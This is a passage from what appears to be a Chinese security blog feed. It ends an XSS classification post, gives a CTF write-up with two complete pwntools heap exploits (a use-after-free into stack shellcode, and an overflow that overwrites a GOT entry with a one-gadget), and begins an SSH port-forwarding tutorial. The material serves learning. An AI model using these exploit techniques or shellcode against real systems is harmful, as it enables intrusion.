src=&quot;javascript:alert(/xss/)&quot; &gt;</code>, src标签中利用伪协议实现XSS。还有CSS的<code>expression()</code>等。</p><h3 id="说几句"><a href="#说几句" class="headerlink" title="说几句"></a>说几句</h3><p>当然术语只是OWASP自己起的，但是相当于把XSS的概念给编织起来，如果编织的还不错，不妨可以学学方便回忆。</p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>按照网上流传的分类来说有三种：</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><ul><li>输入持久化（存在了数据库中），每次访问都触发</li></ul><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><ul><li><p>输入没有持久化，需要访问带输入的链接（一般在url中）才能触发。</p></li><li><p>输入经过后端代码处理。</p></li></ul><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><ul><li><p>输入同样没有持久化，需要访问带输入的链接（一般在url中）触发</p></li><li><p>输入没有经过后端代码处理。</p></li><li><p>改变了DOM树结构。</p></li></ul><h3 id="一张表"><a href="#一张表" class="headerlink" title="一张表"></a>一张表</h3><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/20190408151852.png" alt="20190408151852.png"></p><p>整理的很仓促，多有不足。欢迎有兴趣的朋友和我一起来整理补充。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>《白帽子讲Web安全》——吴翰清</li><li><a href="https://www.owasp.org/index.php/Injection_Theory" target="_blank" rel="noopener">https://www.owasp.org/index.php/Injection_Theory</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;p&gt;Web安全深似海，最近想稍微整理下之前扔到笔记堆里假装自己掌握了的其实从来没有翻过的Web安全文章，发现Web安全这一块真的知识点太多了。但
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://lxzmads.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://lxzmads.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>月赛乙队题目记录-2019-04-05</title>
    <link href="http://lxzmads.github.io/2019/04/05/%E6%9C%88%E8%B5%9B%E4%B9%99%E9%98%9F%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95-2019-04-05/"/>
    <id>http://lxzmads.github.io/2019/04/05/月赛乙队题目记录-2019-04-05/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T12:44:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>被红队新进的两位大佬支配了。 这次做了两道pwn， 也还算有参与度把。感觉自己做题速度太慢了，可能也是不熟练的缘故，但更多的是感觉思路没有理的很好，这方面还需要注意总结与锻炼。</p><h1 id="babyfastbin"><a href="#babyfastbin" class="headerlink" title="babyfastbin"></a>babyfastbin</h1><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这道题漏洞很明显，指针在free之后没有置为NULL，典型的UAF。 题目限制只能分配小于128大小的bin，而且题目什么保护也没开。一开始想修改fd然后在GOT表上分配一个堆重写got表，但是发现它在malloc之后会memset然后立即调用一下printf就会崩溃。然后想到保护没开，可以将fd指向栈，在栈上分配一个fake chunk。然后修改ret address进行ROP或直接调shellcode。于是总结一下就可以：</p><ol><li>UAF写fd指向一个栈地址。（栈地址程序会打印出来，也算个提示）</li><li>计算栈上堆到rbp距离，修改ret address跳到紧接着的栈地址（注意别从堆起始地址布置shellcode，要布置在ret address之后，不然会出问题</li><li>get shell</li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">pc=<span class="string">'./babyfastbin'</span></span><br><span class="line">remote_addr=[<span class="string">'124.16.75.162'</span>,<span class="number">40001</span>]</span><br><span class="line">aslr=<span class="keyword">True</span></span><br><span class="line">context.log_level=<span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfastbin'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#p = gdb.debug(pc,'b *0x400b73\nc\n')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(l, d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'0'</span>)</span><br><span class="line">    ru(<span class="string">'info: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'again:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'info:'</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    system = <span class="number">0x4006b6</span></span><br><span class="line">    ls = <span class="number">0x400951</span></span><br><span class="line">    m = <span class="number">0x60209a</span></span><br><span class="line">    shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">   <span class="comment">#ru('name:')</span></span><br><span class="line">    sl(<span class="string">'p'</span>.ljust(<span class="number">5</span>, <span class="string">'\x00'</span>) + <span class="string">'sh\x00'</span>)</span><br><span class="line">    <span class="comment">#show(-120)</span></span><br><span class="line">    <span class="comment">#rv(6)</span></span><br><span class="line">    <span class="comment">#print hex(raddr())</span></span><br><span class="line">    ru(<span class="string">'@ '</span>)</span><br><span class="line">    stack = int(rv(<span class="number">15</span>))</span><br><span class="line">    sh = stack + <span class="number">8</span></span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400d63</span></span><br><span class="line">    print(hex(stack))</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    update(<span class="number">0</span>, p64(stack - <span class="number">16</span>))</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'\x00'</span>*<span class="number">8</span> + shellcode +<span class="string">'\x00'</span>*<span class="number">13</span> + p64(stack + <span class="number">56</span>) + shellcode)</span><br><span class="line">    exit()</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>这道题稍微复杂点，分配堆块时会分配两个，一个大小可以自己确定，另一个大小固定为<code>0x80</code>。先分配的是自定义大小，然后分配另一个。仔细观察会发现在分配堆时对自定义大小堆进行写入时存在4个字节的溢出，这样就可以修改下一个堆(0x80)的大小。这道题没有给任何地址，需要先leak。整体思路大概是：</p><ol><li>分配4个姊妹堆（为了不出现和topchunk合并等问题）姊妹堆自定义的要为fastbin，不然free之后会和0x80大小的堆合并</li><li>update 2号堆通过溢出修改姊妹堆后一个堆(0x80)的大小，使其刚好将紧邻的下一个姊妹堆覆盖</li><li>free 2号堆之后，再malloc两次和之前一样大小的姊妹堆4和5，这样3号堆就相当于有两个指针3和5一起指向它</li><li>free掉5号堆，这样3号指针就指向了一个free掉的unsorted bin，通过display读取得到一个libc地址，泄漏出libc地址</li><li>申请一个自定义大小为0x80的姊妹堆6，update6号为printf got地址，就相当于修改了3号堆中指向自定义堆的地址</li><li>update 3号堆，覆盖printf地址为one gadget地址</li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">pc=<span class="string">'./x'</span></span><br><span class="line">remote_addr=[<span class="string">'124.16.75.162'</span>,<span class="number">40002</span>]</span><br><span class="line">aslr=<span class="keyword">True</span></span><br><span class="line">context.log_level=<span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">elf = ELF(<span class="string">'./x'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#p = gdb.debug(pc,'b *0x400b73\nc\n')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(l, l2, d, d2)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'0'</span>)</span><br><span class="line">    ru(<span class="string">'tion: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(l2))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,l,d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    printf = <span class="number">0x602038</span></span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    update(<span class="number">1</span>,<span class="number">42</span>,<span class="string">'A'</span>*<span class="number">40</span>+<span class="string">'\x51\x01'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    libcb = raddr() - <span class="number">0x3c4b78</span></span><br><span class="line">    one = libcb + <span class="number">0xf1147</span></span><br><span class="line">    lg(<span class="string">'libc base'</span>, libcb)</span><br><span class="line">    malloc(<span class="number">128</span>, <span class="number">128</span>, <span class="string">'mads'</span>, p64(printf))</span><br><span class="line">    raw_input()</span><br><span class="line">    update(<span class="number">2</span>, <span class="number">8</span>, p64(one))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;被红队新进的两位大佬支配了。 这次做了两道pwn， 也还算有参与度把。感觉自己做题速度太慢了，可能也是不熟练的缘故，但更多的是感觉思路没有理的很好，这方面还需要注意总结与锻炼。&lt;/p&gt;
&lt;h1 id=&quot;babyfastbin&quot;&gt;&lt;a href=&quot;#babyfastbin&quot; 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="月赛" scheme="http://lxzmads.github.io/tags/%E6%9C%88%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>浅谈利用SSH端口转发提高生产效率</title>
    <link href="http://lxzmads.github.io/2019/03/28/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E6%95%88%E7%8E%87/"/>
    <id>http://lxzmads.github.io/2019/03/28/浅谈利用SSH端口转发提高生产效率/</id>
    <published>2019-03-27T16:00:00.000Z</published>
    <updated>2019-04-06T12:32:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>丑话说在前，本文没有什么新颖前沿的知识介绍，用的都是几十年前用的技术。只是最近因为学业原因开始过上997的生活，在开发过程中总结出的一点提高生产率的感悟，想在这儿总结一下而已。</p><p>本文用到了以下知识或者工具，如果你已经非常熟悉大可不看此文。如果你觉得你了解不是很多或者说完全没听过，你可以接着往下看：</p><ul><li>计算机网络中关于网卡与端口的基本知识</li><li>端口转发的概念</li><li>OpenSSH(以下简称SSH)</li><li>SSH中本地端口转发与远程端口转发功能</li></ul><h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>来实习没多久，老板就发了一台电脑。我看了下配置觉得还不错，于是就打算用来作为苦力机器来用（大概就是用来跑各种环境、编译测试之类）。由于老板没发路由器，还好给的机器有无线网卡，于是我就用无线网卡配置了一个hotspot作为生产内部网络，这样我的mbp与苦力机就在一个网络上，可以相互通信了。事情就这样发生了。</p><h1 id="远程端口转发初探——点对点代理"><a href="#远程端口转发初探——点对点代理" class="headerlink" title="远程端口转发初探——点对点代理"></a>远程端口转发初探——点对点代理</h1><p>在拿到机器后，首先肯定就是装一大堆的生产软件，docker、pyenv什么的都搞起来，很多软件的下载都涉及到github还有一些海外的站点，速度及其慢。我这个急性子等不了，但是从头配置个fq客户端的话真的说实话挺麻烦的，而且毕竟不是自己机器，把自己血汗钱买的fq服务放上去也不是很放心。我自己mbp上面的fq客户端是配置好的，对我可以开局域网共享，但我并不是特别想这样做。如果想精准的点对点来将mbp的fq服务转发给目标机器，SSH提供的端口转发功能就可以大显身手了。假如我的mbp叫做<code>mbp</code>，苦力机叫做<code>vs</code>，我mbp上fq的socks5服务开在1080端口，那么我就可以这样做</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1080:localhost:1080 root@vs</span><br></pre></td></tr></table></figure><p><code>-R</code>意思是远程端口转发(Remote Port Forwarding)。它的<code>Remote</code>指的是<code>SSH Server</code>，也就是<code>vs</code>机器。<code>远程端口转发</code>指的就是将vs机器上对于1080端口的访问都转发到我们mbp的1080端口，然后再原路返回。这个操作会在vs机器上开一个1080端口。然后我们就可以把它作为fq服务的socks5端口来使用了。</p><h1 id="远程端口转发进阶——接口绑定"><a href="#远程端口转发进阶——接口绑定" class="headerlink" title="远程端口转发进阶——接口绑定"></a>远程端口转发进阶——接口绑定</h1><p>上面说的只能满足我的基本需求，包括github克隆，apt-get依赖等等。但是当我拉起一个docker容器时，内部进行的apt-get速度依然是非常的慢。我觉得它是没有走代理的，而是直接经过docker-proxy向外转发了（未验证）。在官网我发现了一个配置可以配置容器内部的代理，只需要在<code>~/.docker/config.json</code>中添加一个key：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"proxies"</span>:</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="attr">"default"</span>:</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="attr">"httpProxy"</span>: <span class="string">"http://127.0.0.1:3001"</span>,</span><br><span class="line">     <span class="attr">"httpsProxy"</span>: <span class="string">"http://127.0.0.1:3001"</span>,</span><br><span class="line">     <span class="attr">"noProxy"</span>: <span class="string">"*.test.example.com,.example2.com"</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的坑点就是从官方文档复制过来的感觉好像配置中的<code>127.0.0.1</code>指的时我们的宿主机，然而经过测试其实是容器本身！但是并不是说容器内部没法走代理，我们只要稍微改下配置即可。因为容器内是可以路由到宿主机的，所以改为宿主机的proxy即可。</p><p>未完待更。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;丑话说在前，本文没有什么新颖前沿的知识介绍，用的都是几十年前用的技术。只是最近因为学业原因开始过上997的生活，在开发过程中总结出的一点提高生产率的感悟，想在这儿总结一下而已。&lt;/p&gt;
&lt;p&gt;本文用到了以下知识或者工具，如果你已经非常熟悉大可不看此文。如果你觉得你了解不是很
      
    
    </summary>
    
    
      <category term="浅谈" scheme="http://lxzmads.github.io/tags/%E6%B5%85%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF攻防战2019Q1两道pwn</title>
    <link href="http://lxzmads.github.io/2019/03/25/%E7%9C%8B%E9%9B%AACTF%E6%94%BB%E9%98%B2%E6%88%982019Q1%E4%B8%A4%E9%81%93pwn/"/>
    <id>http://lxzmads.github.io/2019/03/25/看雪CTF攻防战2019Q1两道pwn/</id>
    <published>2019-03-24T16:00:00.000Z</published>
    <updated>2019-03-25T13:36:22.000Z</updated>
    
